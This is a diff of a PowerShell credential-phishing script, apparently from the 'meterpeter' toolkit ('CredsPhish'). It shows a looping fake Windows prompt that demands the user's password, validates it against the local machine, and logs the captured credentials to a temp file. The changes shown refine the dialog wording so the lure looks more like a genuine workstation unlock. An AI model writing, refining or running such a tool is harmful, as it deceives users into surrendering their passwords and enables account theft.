@@ -1,4 +1,7 @@
-﻿<#
+<#
+.SYNOPSIS
+Standalone Powershell script that will promp the current user for a valid credentials.
+
 .Author: @enigma0x3 &('r00t-3xp10it')
    Required Dependencies: None
    Optional Dependencies: None
@@ -38,7 +41,7 @@ while ($counter -lt '1000000000')
   $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
 	
   $account=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
-  $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", $Account, "NetBiosUserName")
+  $credential = $host.ui.PromptForCredential("WorkStation - Credentials Required", "Please enter your username and password.", $Account, "NetBiosUserName")
   #$validate = $DS.ValidateCredentials($Account, $credential.GetNetworkCredential().password)
 
     $user = $credential.GetNetworkCredential().username;
@@ -50,7 +53,7 @@ while ($counter -lt '1000000000')
       $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again.", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
     }else{
       $timestomp = Get-Date;
-      $msgbox = [System.Windows.Forms.MessageBox]::Show("Authentication Successful, WorkStation UnLocked.", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+      $msgbox = [System.Windows.Forms.MessageBox]::Show("Authentication Successful, UnLocking WorkStation.", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
       echo "" > $env:tmp\CredsPhish.log
       echo "meterpeter - CredsPhish" >> $env:tmp\CredsPhish.log
       echo "-----------------------" >> $env:tmp\CredsPhish.log
